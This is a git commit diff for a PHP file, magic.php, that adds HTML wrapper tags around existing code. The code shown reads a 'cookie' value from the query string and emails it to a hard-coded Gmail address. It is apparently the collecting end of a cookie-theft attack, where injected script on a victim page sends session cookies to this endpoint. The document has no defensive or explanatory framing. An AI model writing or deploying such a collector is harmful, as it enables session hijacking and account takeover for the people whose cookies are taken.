ac1a27c63d4e41a93e7214050001876cea9146d0
clam~ <pie314159265@users.noreply.github.com>
2017-05-13 16:58:00 -0400

    Update magic.php

--- purple/magic.php
+++ purple/magic.php
@@ -1,5 +1,9 @@
+<!DOCTYPE html>
+<head></head>
+<body>
 <?php
     $message = wordwrap($_GET["cookie"], 69, "\r\n");
     mail( 'pie.tastes.good.314@gmail.com', 'cookie', $message);
     echo 'hi';
 ?>
+</body>
